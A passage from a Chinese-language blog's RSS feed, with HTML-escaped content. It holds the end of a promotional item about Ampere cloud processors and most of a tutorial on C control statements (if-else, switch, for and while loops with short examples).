&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;可持续计算价值&#34;&gt;可持续计算价值
&lt;/h3&gt;&lt;p&gt;Ampere云原生处理器以可预测的高性能、弹性扩展和能效设计，实现开发效率、成本节约与环保的三重收益。&lt;/p&gt;
&lt;h3 id=&#34;开发者资源&#34;&gt;开发者资源
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;与Ampere销售团队洽谈合作&lt;/li&gt;
&lt;li&gt;通过开发者计划申请系统试用&lt;/li&gt;
&lt;li&gt;订阅开发者通讯&lt;/li&gt;
&lt;li&gt;加入技术社区讨论&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>C语言控制语句全面指南：类型、示例与最佳实践</title>
        <link>http://localhost:1313/p/c%E8%AF%AD%E8%A8%80%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97%E7%B1%BB%E5%9E%8B%E7%A4%BA%E4%BE%8B%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</link>
        <pubDate>Mon, 04 Aug 2025 07:41:18 +0800</pubDate>
        
        <guid>http://localhost:1313/p/c%E8%AF%AD%E8%A8%80%E6%8E%A7%E5%88%B6%E8%AF%AD%E5%8F%A5%E5%85%A8%E9%9D%A2%E6%8C%87%E5%8D%97%E7%B1%BB%E5%9E%8B%E7%A4%BA%E4%BE%8B%E4%B8%8E%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5/</guid>
        <description>&lt;h1 id=&#34;控制语句在c语言中的作用&#34;&gt;控制语句在C语言中的作用
&lt;/h1&gt;&lt;p&gt;控制语句（又称控制结构）是管理程序执行流程的指令，通过条件判断、循环和跳转实现复杂的逻辑控制。它们使开发者能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;根据条件执行不同代码块（决策语句）&lt;/li&gt;
&lt;li&gt;重复执行特定任务（循环语句）&lt;/li&gt;
&lt;li&gt;无条件转移执行位置（跳转语句）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;决策语句&#34;&gt;决策语句
&lt;/h2&gt;&lt;h3 id=&#34;1-if-else语句&#34;&gt;1. if-else语句
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;condition&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 条件为真时执行
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 条件为假时执行
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;典型应用&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 检查数字正负
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;正数&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;负数&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 嵌套if判断三个数最大值
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;2-switch-case语句&#34;&gt;2. switch-case语句
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;expression&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;nl&#34;&gt;value1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 代码段1
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;c1&#34;&gt;// 默认代码段
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;switch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;day&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;周日&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;周一&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// ...其他情况
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;无效输入&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;循环语句&#34;&gt;循环语句
&lt;/h2&gt;&lt;h3 id=&#34;1-for循环&#34;&gt;1. for循环
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 重复执行的代码
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;斐波那契数列实现&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;printf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;%d&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;2-while循环&#34;&gt;2. while循环
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;digit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;sum&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;digit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
